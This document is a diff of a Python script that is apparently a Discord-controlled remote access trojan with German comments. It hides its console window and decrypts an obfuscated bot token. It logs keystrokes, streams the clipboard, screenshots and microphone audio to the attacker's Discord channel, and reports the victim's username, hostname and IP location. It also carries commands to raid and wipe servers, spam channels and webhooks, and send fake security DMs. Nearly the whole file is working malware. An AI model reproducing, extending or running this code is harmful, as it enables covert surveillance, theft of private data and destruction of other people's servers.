@@ -1,12 +1,19 @@
-import os
-import platform
+import tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
+from discord.ext import commands, tasks
+from PIL import ImageGrab
+from pynput.keyboard import Listener
+from gtts import gTTS
+from io import BytesIO
+from typing import Union
+from datetime import datetime
+from colorama import Fore, Style
+from tkinter import messagebox
+
 if platform.system() == "Windows":
     os.system('cls')
 else:
     os.system('clear')
 
-from colorama import Fore, Style
-import time
 print(Style.RESET_ALL)
 ASCII = """
 
@@ -42,89 +49,40 @@ time.sleep(1.5)
 
 DEV = "tilov"
 
-import win32gui
-import win32con
-import os
-import ctypes
-
 if not os.getlogin() == DEV:
-    # Das Skript als aktives Fenster setzen
     win32gui.SetForegroundWindow(ctypes.windll.kernel32.GetConsoleWindow())
 
-    # Das aktuelle aktive Fenster schließen
     console_window = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(console_window, win32con.SW_HIDE) # Das Konsolenfenster ausblenden
+    win32gui.ShowWindow(console_window, win32con.SW_HIDE)
 else: print("skipping exit")
 
-################################################################################
-
-import binascii
+#
 
 def xor_encrypt_decrypt(data, key):
     key = (key * (len(data) // len(key) + 1))[:len(data)]
     return bytearray(a ^ b for a, b in zip(data, key.encode()))
 
-# Encrypted hex string and key
 hex_string = "1d353a433a3b3f411e2514413a053b031e3526403a3b37031d065d34005e4313634f1922343d11332322323e3a2e1e1515382b3a390227010a073014231a362c0a281c4442361f3d"
 key = "Passwort"
 
-# Convert hex string to bytes
 encrypted_data = binascii.unhexlify(hex_string)
 
-# Decrypt the data
 decrypted_data = xor_encrypt_decrypt(encrypted_data, key).decode('utf-8')
 TOKEN = decrypted_data
 
-################################################################################
+#
 
 current_directory = os.getcwd()
 
-import discord
-import discord.ext
-from discord.ext import commands, tasks
-import platform
-import subprocess
-import os
-import requests
-import sys
-from PIL import ImageGrab
-import asyncio
-import keyboard  # Keyboard library for keylogging
-from pynput.keyboard import Listener  # Listener from pynput for global keylogging
-import winreg
-import pyaudio
-import sounddevice as sd
-import numpy as np
-import threading
-from gtts import gTTS
-from io import BytesIO
-import pyttsx3
-import pyperclip
-import multiprocessing
-import tempfile
-import cv2
-import io
-import aiohttp
-import random
-import difflib
-from typing import Union
-import ctypes
-import pymsgbox
-from datetime import datetime
-import ctypes
-import ctypes.wintypes
-import time
-import inspect
 
-# Define global variables
 notification_sent = False
-loop_running = False  # Variable to track if the screenshot loop is running
-# Globale Variable, um den vorherigen Clipboard-Inhalt zu speichern
+loop_running = False
+
 clipboard_previous = None
-# Globale Variable, um den Kanal für die Clipboard-Benachrichtigungen zu speichern
+
 clipboard_channel = None
-spamming_enabled = True  # Flag to track whether spamming is enabled
-# Globale Variable zur Referenzierung des Popup-Fensters
+spamming_enabled = True
+
 popup_window = None
 popup_root = None
 close_button_window = None
@@ -132,7 +90,6 @@ popup_thread = None
 
 cwd = os.getcwd()
 
-# Define intents
 intents = discord.Intents.default()
 intents.message_content = True
 intents.voice_states = True
@@ -147,24 +104,18 @@ intents.invites = True
 intents.presences = True
 intents.typing = True
 
-# Create the bot with intents
 bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
 
-# Buffer to store keylog data
 keylog_buffer = []
 
-hidden_commands = {"delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
+hidden_commands = {"serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}
 
-# Callback function for key press events
 def on_press(key):
     try:
-        # Add the pressed key to the buffer
         keylog_buffer.append(key.char)
     except AttributeError:
-        # Special keys (e.g., Shift, Enter) are stored as attributes, handle them separately
         keylog_buffer.append(str(key))
 
-# Function to send keylog data to bot
 async def send_keylog_data(ctx):
     if keylog_buffer:
         keylog_data = '\n'.join(keylog_buffer)
@@ -172,7 +123,6 @@ async def send_keylog_data(ctx):
     else:
         await ctx.send("No keylog data available.")
 
-# Funktion zum Senden einer eingebetteten Nachricht
 async def send_embed(ctx, message):
     embed = discord.Embed(description=message, color=discord.Color.blue())
     await ctx.send(embed=embed)
@@ -185,9 +135,8 @@ async def on_ready():
     print(f'We have logged in as {bot.user}')
 
     if not notification_sent:
-        guild = bot.guilds[0]  # Get the first guild the bot is connected to
+        guild = bot.guilds[0]
 
-        # Das spezifizierte Mitglied und den Bot abrufen
         member = guild.get_member(691670319248965694)
         bot_member = guild.me
 
@@ -206,11 +155,9 @@ async def on_ready():
             running = f"-----\n# Bot is ready and running!\n \nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.environ.get('COMPUTERNAME') or os.environ.get('HOSTNAME')}\n{IPloc}\n-----"
         else: running = "Bot is ready and running!"
 
-        # Kanal erstellen und Berechtigungen setzen
         user_channel_name = os.getlogin()
         existing_channel = discord.utils.get(guild.channels, name=user_channel_name)
         if not existing_channel:
-            # Create a new channel if it doesn't exist
             try:
                 clipboard_channel = await guild.create_text_channel(name=user_channel_name)
                 if member:
@@ -227,22 +174,17 @@ async def on_ready():
 
         notification_sent = True
 
-        # Setze die Aktivität des Bots
         await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='Flint'))
         print("Aktivität des Bots gesetzt.")
 
-        # Setze den Status des Bots auf offline
         await bot.change_presence(status=discord.Status.offline)
         print("Bot Status auf offline gesetzt.")
 
-        # Starte den Hintergrundprozess zur Überwachung des Clipboards
         bot.loop.create_task(monitor_clipboard())
         print("Clipboard Überwachungsprozess gestartet.")
 
-        # Überprüfen, ob die Rolle bereits existiert
         existing_role = discord.utils.get(guild.roles, name="BOT_perms")
         if not existing_role:
-            # Rolle erstellen, wenn sie noch nicht existiert
             try:
                 role = await guild.create_role(name="BOT_perms", permissions=discord.Permissions.all())
                 print("Rolle 'BOT_perms' erstellt.")
@@ -254,9 +196,8 @@ async def on_ready():
 
         if role is None:
             print("Die Rolle 'BOT_perms' wurde nicht erstellt.")
-            return  # Beende die Funktion, da die Rolle nicht erstellt wurde.
+            return
 
-        # Rolle dem spezifizierten Mitglied und dem Bot zuweisen, wenn das Mitglied vorhanden ist
         if member:
             try:
                 await member.add_roles(role)
@@ -264,7 +205,6 @@ async def on_ready():
             except Exception as e:
                 print(f"Fehler beim Hinzufügen der Rolle für {member}: {e}")
 
-        # Rolle dem Bot zuweisen, wenn der Bot-Mitglied vorhanden ist
         if bot_member:
             try:
                 await bot_member.add_roles(role)
@@ -275,12 +215,12 @@ async def on_ready():
     if not os.getlogin() == DEV:
         await on(clipboard_channel)
 
-################################################################################
+#
 
 @bot.event
 async def on_message(message):
     if message.author == bot.user:
-        await message.add_reaction("❌")  # Add "❌" reaction to all messages sent by the bot
+        await message.add_reaction("❌")
         return
 
     if message.channel.name != os.getlogin():
@@ -292,16 +232,15 @@ async def on_message(message):
         await bot.process_commands(message)
 
 async def handle_command(message):
-    # Befehl aus der Nachricht extrahieren
     content = message.content[len(bot.command_prefix):].split()
     if not content:
-        await message.delete()  # Nachricht löschen, wenn sie nur das Präfix enthält
+        await message.delete()
         return
 
     command = content[0]
 
     try:
-        await message.delete()  # Nachricht löschen
+        await message.delete()
     except discord.Forbidden:
         print("Bot does not have permission to delete messages.")
     except discord.HTTPException:
@@ -329,7 +268,6 @@ async def handle_invalid_command(message):
             reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
             if str(reaction.emoji) == '✅':
                 await msg.delete()
-                # Command ausführen
                 ctx = await bot.get_context(message)
                 new_message = ctx.message
                 new_message.content = f"{bot.command_prefix}{suggestion}"
@@ -364,7 +302,6 @@ async def on_reaction_add(reaction, user):
                 await reaction.message.delete()
             except discord.NotFound:
                 print("Message already deleted.")
-            # Führe den vorgeschlagenen Befehl aus
             suggestion = reaction.message.content.split('`')[1]
             ctx = await bot.get_context(reaction.message)
             new_message = ctx.message
@@ -372,7 +309,6 @@ async def on_reaction_add(reaction, user):
             await bot.process_commands(new_message)
             return
 
-    # Lösche die Nachricht, wenn der Benutzer auf das X reagiert
     if user.id == 691670319248965694 and str(reaction.emoji) == '❌':
         try:
             await reaction.message.delete()
@@ -384,28 +320,26 @@ async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
         await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")
     elif isinstance(error, commands.CommandNotFound):
-        pass  # Do nothing, let the handle_invalid_command function handle it
+        pass
     else:
         await ctx.send(f"Ein Fehler ist aufgetreten: {error}")
         print(f"Ein Fehler ist aufgetreten: {error}")
 
 @bot.event
 async def on_command(ctx):
-    # Server- und Kanal-ID, in die die Nachricht gesendet werden soll
     target_guild_id = 1000796001541570670
     target_channel_id = 1246457619812450345
 
-    # Den Zielkanal im Zielserver finden
     target_channel = bot.get_channel(target_channel_id)
-    command_args = ctx.message.content.split()
-    command_name = command_args[1] if len(command_args) > 1 else ''  # Extrahiere den Befehl am Ende
+
+    command_content = ctx.message.content
 
     if target_channel:
-        await target_channel.send(f"AUTHOR: {ctx.author.mention}\nCOMMAND: {ctx.command}\nARGUMENTS: {command_name}")
+        await target_channel.send(f"AUTHOR: {ctx.author.mention}\nCOMMAND: {command_content}")
     else:
         print(f"Kanal mit der ID {target_channel_id} wurde nicht gefunden.")
 
-################################################################################
+#
 
 @bot.command(help="Gets geolocation data based on IP")
 async def geolocation(ctx):
@@ -431,7 +365,6 @@ async def specs(ctx):
 
     await send_embed_message(ctx.channel, system_specs)
 
-# Define a new command to retrieve devices from Device Manager
 @bot.command(help="Displays devices from Device Manager")
 async def devices(ctx):
     try:
@@ -444,43 +377,36 @@ async def devices(ctx):
     except Exception as e:
         await send_embed_message(ctx.channel, f"Error retrieving devices: {str(e)}")
 
-# Function to send devices in multiple messages
 async def send_devices_messages(channel, devices):
     max_length = 2000
     current_length = 0
     current_message = ""
     for line in devices.split('\n'):
-        if len(current_message) + len(line) + 1 > max_length:  # Check if adding line exceeds max length
+        if len(current_message) + len(line) + 1 > max_length:
             embed = discord.Embed(description=current_message, color=discord.Color.blue())
             await channel.send(embed=embed)
             current_message = ""
         current_message += line + '\n'
-    if current_message:  # Send remaining message
+    if current_message:
         embed = discord.Embed(description=current_message, color=discord.Color.blue())
         await channel.send(embed=embed)
 
-# Function to retrieve devices from Device Manager
 def get_device_list():
     devices = []
 
-    # Get the devices from the registry
     try:
-        import winreg as reg
 
-        # Open the registry key for Enum
+
         enum_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum', 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
 
-        # Iterate over subkeys
         for category in iter_subkeys(enum_key):
             category_path = rf'SYSTEM\CurrentControlSet\Enum\{category}'
             category_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, category_path, 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
 
-            # Iterate over subcategories
             for subcategory in iter_subkeys(category_key):
                 subcategory_path = rf'SYSTEM\CurrentControlSet\Enum\{category}\{subcategory}'
                 subcategory_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, subcategory_path, 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
 
-                # Get the device names
                 device_names = []
                 try:
                     i = 0
@@ -491,7 +417,6 @@ def get_device_list():
                 except OSError:
                     pass
 
-                # Append the category and device names to the devices list
                 devices.append((category, device_names))
 
     except Exception as e:
@@ -499,7 +424,6 @@ def get_device_list():
 
     return devices
 
-# Helper function to iterate over subkeys
 def iter_subkeys(key):
     i = 0
     while True:
@@ -510,7 +434,6 @@ def iter_subkeys(key):
         except WindowsError as e:
             break
 
-# Function to format devices for display
 def format_devices(devices):
     formatted_devices = []
     for device in devices:
@@ -526,7 +449,6 @@ def format_devices(devices):
 async def help(ctx):
     await ctx.send("Befehl nicht gefunden. Meintest du: `help`?")
 
-# Change the default help command
 @bot.command(help="Displays this message")
 async def helpy(ctx, category: str = None):
     embed_pages = []
@@ -604,19 +526,15 @@ async def shutdown(ctx):
             subprocess.run(["sudo", "shutdown", "-h", "now"], shell=True)
     else: ctx.send("DU HURENSOHN")
 
-# Define a command to reload the script
 @bot.command(help="Reloads the bot script")
 async def reload(ctx):
     global current_directory
     await send_embed_message(ctx.channel, "Reloading the script...")
 
-    # Speichere das aktuelle Verzeichnis
     saved_directory = current_directory
 
-    # Wechsle in das ursprüngliche Verzeichnis zurück
     os.chdir(saved_directory)
 
-    # Neuladen des Skripts
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 @bot.command(help="Unloads the bot script")
@@ -628,34 +546,28 @@ async def eject(ctx):
     except Exception as e:
         print(f"An error occurred while unloading the script: {e}")
     finally:
-        await bot.close()  # Schließt den Bot-Client korrekt
-        sys.exit(0)  # Beendet das Skript-Fenster ohne Fehlermeldung
+        await bot.close()
+        sys.exit(0)
 
-# Define a test command
 @bot.command(help="Creates a role, a text channel, a voice channel, and a category named 'w'")
 async def test(ctx):
     try:
-        # Rolle erstellen asynchron
         role_name = "w"
         role = await ctx.guild.create_role(name=role_name)
         await ctx.send("Role created: w")
 
-        # Textkanal erstellen
         text_channel = await ctx.guild.create_text_channel(name="w")
         await ctx.send("Text channel created: w")
 
-        # Sprachkanal erstellen
         voice_channel = await ctx.guild.create_voice_channel(name="w")
         await ctx.send("Voice channel created: w")
 
-        # Kategorie erstellen
         category = await ctx.guild.create_category_channel(name="w")
         await ctx.send("Category created: w")
 
     except Exception as e:
         await ctx.send(f"An error occurred: {e}")
 
-# Define a command to take a screenshot
 @bot.command(help="Takes a screenshot")
 async def screen(ctx):
     with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
@@ -663,7 +575,6 @@ async def screen(ctx):
         all_screens.save(tmp_file.name)
         await ctx.send(file=discord.File(tmp_file.name))
 
-# Define a command to start the screenshot loop
 @bot.command(help="Starts a screenshot loop")
 async def screenstart(ctx):
     global loop_running
@@ -677,9 +588,8 @@ async def screenstart(ctx):
             all_screens = ImageGrab.grab(all_screens=True)
             all_screens.save(tmp_file.name)
             await ctx.send(file=discord.File(tmp_file.name))
-        await asyncio.sleep(20)  # Wait for 20 seconds before taking the next screenshot
+        await asyncio.sleep(20)
 
-# Define a command to stop the screenshot loop
 @bot.command(help="Stops the screenshot loop")
 async def screenstop(ctx):
     global loop_running
@@ -689,18 +599,16 @@ async def screenstop(ctx):
     loop_running = False
     await ctx.send("Screenshot loop stopped.")
 
-# Function to send a message in embed format
 async def send_embed_message(channel, content):
     embed = discord.Embed(description=content, color=discord.Color.blue())
     await channel.send(embed=embed)
 
-# Funktion zum kontinuierlichen Senden von Audio
 async def send_audio_background(stream, voice_client, stop_event):
     CHUNK = 2048
     loop = asyncio.get_event_loop()
 
     while not voice_client.is_connected():
-        await asyncio.sleep(0.1)  # Warte, bis die Verbindung aufgebaut ist
+        await asyncio.sleep(0.1)
 
     while not stop_event.is_set():
         try:
@@ -713,14 +621,13 @@ async def send_audio_background(stream, voice_client, stop_event):
             print(f"Fehler beim Senden von Audio: {e}")
             break
 
-# Funktion zum Übertragen von Mikrofon-Audio
 async def play_microphone(ctx):
     FORMAT = pyaudio.paInt16
     CHANNELS = 1
-    RATE = 100000  # Abtastrate auf den Standardwert ändern
+    RATE = 100000
     CHUNK = 100000
     p = pyaudio.PyAudio()
-    stream = None  # Initialisiere die Variable stream
+    stream = None
 
     stop_event = asyncio.Event()
 
@@ -734,20 +641,16 @@ async def play_microphone(ctx):
 
         voice_client = await voice_channel.connect()
 
-        # Öffne das Mikrofon und starte das Streaming
         stream = p.open(format=FORMAT,
                         channels=CHANNELS,
                         rate=RATE,
                         input=True,
                         frames_per_buffer=CHUNK)
 
-        # Starte die Hintergrund-Übertragung von Audio in einem separaten Task
         audio_task = asyncio.create_task(send_audio_background(stream, voice_client, stop_event))
 
-        # Warte darauf, dass der Nutzer den Befehl zum Stoppen gibt
         await ctx.send("Audio-Übertragung gestartet. Verwenden Sie >leavevoice, um die Übertragung zu beenden.")
 
-        # Überwachung auf den Befehl zum Stoppen der Audio-Übertragung
         while True:
             await asyncio.sleep(1)
 
@@ -755,23 +658,18 @@ async def play_microphone(ctx):
         await ctx.send(f"Fehler bei der Audio-Übertragung: {e}")
 
     finally:
-        # Stelle sicher, dass das Stream-Objekt ordnungsgemäß geschlossen wird
         if stream is not None and stream.is_active():
             stream.stop_stream()
             stream.close()
-        # Beende den PyAudio-Stream
         p.terminate()
 
-        # Trenne die Verbindung vom Sprachkanal
         if ctx.voice_client.is_connected():
             await ctx.voice_client.disconnect()
 
-# Define a command to join a voice channel and stream microphone audio
 @bot.command(help="Joins the voice channel and streams microphone audio")
 async def joinvoice(ctx):
     await play_microphone(ctx)
 
-# Define a command to leave the voice channel
 @bot.command(help="Leaves the voice channel")
 async def leavevoice(ctx):
     if ctx.voice_client is None:
@@ -787,7 +685,7 @@ async def spam(ctx):
         async def create_channel_and_spam(i):
             channel = await ctx.guild.create_text_channel(name=f"raided-by-heidi-{i}")
             for _ in range(100):
-                await asyncio.sleep(5)  # Warte 1 Sekunde zwischen den Nachrichten
+                await asyncio.sleep(5)
                 await channel.send("@everyone You just got raided by Heidi!")
 
         tasks = [create_channel_and_spam(i) for i in range(1, 101)]
@@ -828,7 +726,7 @@ async def delall(ctx):
 
     async def delete_item(item):
         if isinstance(item, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
-            if item.name != user_channel_name and item.name != "nudel":  # Skip the channel named "nudel"
+            if item.name != user_channel_name and item.name != "nudel":
                 print(f"Lösche Kanal/Kategorie: {item.name}")
                 await item.delete()
         elif isinstance(item, discord.Role):
@@ -855,7 +753,6 @@ async def delall(ctx):
 
     items_to_delete = ctx.guild.channels + ctx.guild.roles + list(ctx.guild.emojis) + list(ctx.guild.stickers)
 
-    # Durchlaufe alle Voice-Channels und füge Voice-Clients zur Liste der zu löschenden Elemente hinzu
     for vc in ctx.guild.voice_channels:
         if vc.guild.voice_client:
             items_to_delete.append(vc.guild.voice_client)
@@ -869,52 +766,39 @@ async def delall(ctx):
 
 @bot.command(help= "Set every channel as nsfw")
 async def nsfw(ctx):
-    # Überprüfe, ob der Autor des Befehls Administratorberechtigungen hat
     if ctx.author.guild_permissions.administrator:
-        # Iteriere durch alle Kanäle auf dem Server
         for channel in ctx.guild.channels:
             try:
-                # Versuche, den Kanal in einen NSFW-Kanal zu ändern
                 await channel.edit(nsfw=True)
                 print(f"Der Kanal {channel.name} wurde zu einem NSFW-Kanal geändert.")
             except Exception as e:
-                # Falls eine Ausnahme auftritt (z. B. fehlende Berechtigungen), gebe eine Fehlermeldung aus
                 print(f"Fehler beim Ändern des Kanals {channel.name}: {e}")
         await ctx.send("Alle Kanäle wurden zu NSFW-Kanälen geändert.")
     else:
-        # Falls der Autor des Befehls keine Administratorberechtigungen hat, sende eine Fehlermeldung
         await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")
 
 @bot.command(help= "Set every channel as non nsfw")
 async def unnsfw(ctx):
-    # Überprüfe, ob der Autor des Befehls Administratorberechtigungen hat
     if ctx.author.guild_permissions.administrator:
-        # Iteriere durch alle Kanäle auf dem Server
         for channel in ctx.guild.channels:
             try:
-                # Überprüfe, ob der Kanal NSFW ist, und ändere ihn dann zu einem normalen Kanal
                 if channel.is_nsfw():
                     await channel.edit(nsfw=False)
                     print(f"Der NSFW-Kanal {channel.name} wurde zu einem normalen Kanal geändert.")
             except Exception as e:
-                # Falls eine Ausnahme auftritt (z. B. fehlende Berechtigungen), gebe eine Fehlermeldung aus
                 print(f"Fehler beim Ändern des Kanals {channel.name}: {e}")
         await ctx.send("Alle NSFW-Kanäle wurden in normale Kanäle geändert.")
     else:
-        # Falls der Autor des Befehls keine Administratorberechtigungen hat, sende eine Fehlermeldung
         await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")
 
 @bot.command(help="Deletes all soundboards")
 async def delsound(ctx):
-    # Überprüfe, ob der Bot Administratorrechte hat
     if not ctx.guild.me.guild_permissions.administrator:
         await ctx.send("Der Bot benötigt Administratorberechtigungen, um Soundboards zu löschen.")
         return
 
-    # Hole alle verfügbaren Guild-Features
     guild_features = ctx.guild.features
 
-    # Überprüfe, ob Soundboards vorhanden sind
     if "DISCOVERABLE" in guild_features:
         await ctx.send("Soundboards können nicht direkt über die API gelöscht werden.")
         await ctx.send("Bitte entfernen Sie die Soundboards manuell über die Discord-Benutzeroberfläche.")
@@ -949,16 +833,13 @@ async def repic(ctx, url: str = None):
         return
 
     if url:
-        # Check if the URL points to an image
         if not (url.endswith(('.png', '.jpg', '.jpeg', '.gif')) or 'cdn.discordapp.com' in url):
             await ctx.send("Unsupported file format or URL. Please provide a direct link to an image file or use a valid Discord CDN link.")
             return
 
-        # If it's a Discord CDN link, no need to download
         if 'cdn.discordapp.com' in url:
             data = requests.get(url).content
         else:
-            # Download the image data from the URL
             try:
                 response = requests.get(url)
                 response.raise_for_status()
@@ -968,15 +849,12 @@ async def repic(ctx, url: str = None):
                 return
     else:
         attachment = ctx.message.attachments[0]
-        # Check if the attached file is an image
         if attachment.content_type.startswith('image'):
-            # Download the image data
             data = await attachment.read()
         else:
             await ctx.send("Unsupported file format. Please attach an image file or provide a direct link to an image file.")
             return
 
-    # Change server icon
     try:
         await ctx.guild.edit(icon=data)
         await ctx.send("Server icon changed successfully.")
@@ -987,11 +865,11 @@ async def repic(ctx, url: str = None):
 async def auditspam(ctx):
     role_name = "raided by Heidi"
 
-    for _ in range(100):  # Perform the create/delete action 100 times
+    for _ in range(100):
         role = await ctx.guild.create_role(name=role_name)
-        await asyncio.sleep(0.1)  # Slight delay to ensure actions are logged
+        await asyncio.sleep(0.1)
         await role.delete()
-        await asyncio.sleep(0.1)  # Slight delay to ensure actions are logged
+        await asyncio.sleep(0.1)
 
     await ctx.send("Audit log spammed with role create/delete actions 100 times.")
 
@@ -1027,7 +905,6 @@ async def fakedm(ctx):
 
 @bot.command(help="Sends a fake security DM to a specified member")
 async def fakedmu(ctx, member_id: int):
-    # Find the member with the given ID
     member = ctx.guild.get_member(member_id)
     if member:
         try:
@@ -1071,7 +948,6 @@ async def ban(ctx, member: Union[discord.Member, discord.Object]):
     else:
         try:
             await bot.http.ban(member.id, ctx.guild.id, 0)
-            # Hier wird die Person gepingt
             await ctx.send(f'<@{member.id}> wurde gebannt.')
         except discord.NotFound:
             await ctx.send("Die Person konnte nicht gefunden werden.")
@@ -1091,19 +967,16 @@ async def kick(ctx, member: discord.Member):
     await member.kick()
     await ctx.send(f'{member.display_name} has been kicked.')
 
-# Befehl für das Senden einer gefälschten Nachricht im Namen eines anderen Benutzers
 @bot.command(help="Sends a fake message in someone else's name")
 async def fakemessage(ctx, member: discord.Member, *, message: str):
     await ctx.message.delete()
     await member.send(message)
 
-# Befehl für das Hinzufügen von gefälschten Stimmen zu einer Umfrage
 @bot.command(help="Manipulates poll results by adding a fake vote")
 async def fakevote(ctx, poll_message_id: int, reaction: str):
     poll_message = await ctx.channel.fetch_message(poll_message_id)
     await poll_message.add_reaction(reaction)
 
-# Befehl für das Senden gefälschter Kick/Ban-Nachrichten
 @bot.command(help="Sends fake kick/ban messages")
 async def fakekick(ctx, member: discord.Member, *, reason: str):
     kick_embed = discord.Embed(
@@ -1114,13 +987,11 @@ async def fakekick(ctx, member: discord.Member, *, reason: str):
     kick_embed.add_field(name="Reason", value=reason)
     await ctx.send(embed=kick_embed)
 
-# Befehl für das Senden von automatisch generierten unangemessenen Inhalten
 @bot.command(help="Posts automatically generated inappropriate content")
 async def spamcontent(ctx, count: int):
     for _ in range(count):
         await ctx.send("https://pornhub.com/")
 
-# Befehl für das Löschen des Nachrichtenverlaufs in einem Kanal
 async def purge_channel(channel):
     deleted = 0
     while True:
@@ -1130,32 +1001,31 @@ async def purge_channel(channel):
             break
     return deleted
 
-# Funktion zum Löschen des Nachrichtenverlaufs in einem Kanal
 @bot.command(help="Deletes the message history in a channel")
 async def clear(ctx, *channels: discord.TextChannel):
     total_deleted = 0
 
     if not channels:
-        start_time = time.perf_counter()  # Startzeitmessung
+        start_time = time.perf_counter()
         deleted = await purge_channel(ctx.channel)
         total_deleted += deleted
-        end_time = time.perf_counter()  # Endzeitmessung
-        total_time = end_time - start_time  # Berechnen der benötigten Zeit
+        end_time = time.perf_counter()
+        total_time = end_time - start_time
         await ctx.send(f'Cleared {deleted} messages in {total_time:.4f} seconds in {ctx.channel.mention}', delete_after=2)
     else:
-        start_time = time.perf_counter()  # Startzeitmessung
+        start_time = time.perf_counter()
         tasks = [purge_channel(channel) for channel in channels]
         deleted_counts = await asyncio.gather(*tasks)
         total_deleted += sum(deleted_counts)
-        end_time = time.perf_counter()  # Endzeitmessung
-        total_time = end_time - start_time  # Berechnen der benötigten Zeit
+        end_time = time.perf_counter()
+        total_time = end_time - start_time
         await ctx.send(f'Cleared a total of {total_deleted} messages in {total_time:.4f} seconds in the specified channels', delete_after=2)
 
     try:
-        await asyncio.sleep(total_time)  # Warten bis alle Löschnachrichten gelöscht sind
-        await ctx.message.delete()  # Löschen der ursprünglichen Löschnachricht
+        await asyncio.sleep(total_time)
+        await ctx.message.delete()
     except discord.NotFound:
-        pass  # Nachricht wurde bereits gelöscht oder konnte nicht gefunden werden
+        pass
 
 @bot.command(help="Deletes the message history in all channels")
 async def clearall(ctx):
@@ -1181,20 +1051,16 @@ async def move_role_to_top(guild, role_name):
         print(f"Role '{role_name}' not found.")
         return
 
-    # Hole die Liste aller Rollen des Servers und sortiere sie nach Position
     roles = sorted(guild.roles, key=lambda x: x.position, reverse=True)
 
-    # Finde die Position der gesuchten Rolle
     role_position = roles.index(role)
 
     try:
-        # Ändere die Position der Rolle auf 1 (ganz oben)
         await role.edit(position=1)
 
-        # Aktualisiere die Positionen aller anderen Rollen
         for idx, r in enumerate(roles):
             if r != role:
-                await r.edit(position=idx + 2)  # Rollenpositionen beginnen bei 1, nicht bei 0
+                await r.edit(position=idx + 2)
 
         print(f"Role '{role_name}' moved to the top successfully.")
     except discord.Forbidden:
@@ -1202,8 +1068,6 @@ async def move_role_to_top(guild, role_name):
     except Exception as e:
         print(f"An error occurred: {e}")
 
-# Verwendung:
-# Annahme: 'bot' ist dein discord.py Bot-Objekt
 @bot.command(help= "Move DOPE ROLE to highest role (needs PERMS)")
 async def movdop(ctx):
     await move_role_to_top(ctx.guild, "DOPE ROLE")
@@ -1223,38 +1087,28 @@ async def deldop(ctx):
             print(f"Failed to delete role: {role.name}")
     await ctx.message.delete()
 
-# Define a command to read text using TTS on the local machine
 @bot.command(help="text to speech")
 async def tts(ctx, *, text: str):
-    # Starte die TTS-Funktion in einem separaten Thread
     thread = threading.Thread(target=read_text, args=(ctx, text))
     thread.start()
 
-# Funktion zum Vorlesen des Textes
 def read_text(ctx, text):
     try:
-        # Initialize the TTS engine
         engine = pyttsx3.init()
 
-        # Set properties (optional)
-        engine.setProperty('rate', 150)    # Speed percent (can go over 100)
-        engine.setProperty('volume', 0.9)  # Volume 0-1
+        engine.setProperty('rate', 150)
+        engine.setProperty('volume', 0.9)
 
-        # Say the text
         engine.say(text)
 
-        # Wait until speech is finished
         engine.runAndWait()
 
     except Exception as e:
         ctx.send(f"An error occurred: {e}")
 
-import tkinter as tk
-from tkinter import messagebox
-
 @bot.command(help= "Create a Webhook in every Channel and SPAM!")
 async def ownspam(ctx):
-    global spamming_enabled  # Define global variable
+    global spamming_enabled
     print("Starting ownspam command...")
     tasks = []
     for guild in bot.guilds:
@@ -1266,12 +1120,12 @@ async def ownspam(ctx):
     await asyncio.gather(*tasks)
 
 async def create_and_send_spam(channel):
-    global spamming_enabled  # Define global variable
+    global spamming_enabled
     try:
         webhook = await create_webhook(channel)
         if webhook:
             print(f"Webhook created successfully in channel {channel.name}: {webhook.name}")
-            while spamming_enabled:  # Check if spamming is enabled
+            while spamming_enabled:
                 await send_spam(webhook)
                 await asyncio.sleep(3)
         else:
@@ -1300,9 +1154,9 @@ async def send_spam(webhook):
 
 @bot.command(help= "Delete all the Webhooks created by >ownspam.")
 async def delown(ctx):
-    global spamming_enabled  # Define global variable
+    global spamming_enabled
     print("Starting delown command...")
-    spamming_enabled = False  # Disable spamming
+    spamming_enabled = False
     for guild in bot.guilds:
         print(f"Processing guild: {guild.name}")
         for channel in guild.text_channels:
@@ -1319,14 +1173,12 @@ async def delete_webhook(channel):
     except Exception as e:
         print(f"Failed to delete webhook in channel {channel.name}: {e}")
 
-# Funktion zur Überwachung des Clipboards
 async def monitor_clipboard():
     global clipboard_previous
     while True:
         clipboard_content = pyperclip.paste()
         if clipboard_content != clipboard_previous:
             clipboard_previous = clipboard_content
-            # Sende die Nachricht nur an den in on_ready erstellten Kanal
             if clipboard_channel:
                 await send_embed_message(clipboard_channel, f"Clipboard changed:\n```\n{clipboard_content}\n```")
         await asyncio.sleep(1)
@@ -1343,13 +1195,10 @@ async def getowner(ctx):
 async def banall(ctx):
